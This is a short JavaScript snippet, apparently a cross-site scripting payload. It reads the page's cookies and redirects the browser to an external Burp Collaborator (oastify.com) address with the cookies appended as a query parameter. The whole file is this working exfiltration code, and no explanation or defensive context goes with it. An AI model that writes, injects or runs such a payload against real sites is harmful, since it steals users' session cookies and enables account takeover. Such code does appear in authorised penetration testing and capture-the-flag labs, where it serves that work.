function sendCookieToWebhook(webhookUrl) {
  // Read the cookie
  const cookieData = document.cookie;

  // Construct the webhook URL with the cookie data as a query parameter
  const queryParams = new URLSearchParams({ cookie: cookieData });
  const webhookUrlWithParams = `${webhookUrl}?${queryParams}`;

  // Redirect to the webhook URL with the cookie data appended as a query parameter
  document.location = webhookUrlWithParams;
}

// Specify the webhook URL
const webhookUrl = 'http://fgz0d2uiqi1bjzgvqjjk4ocf76dx1opd.oastify.com';

// Call the function to send the cookie to the webhook
sendCookieToWebhook(webhookUrl);

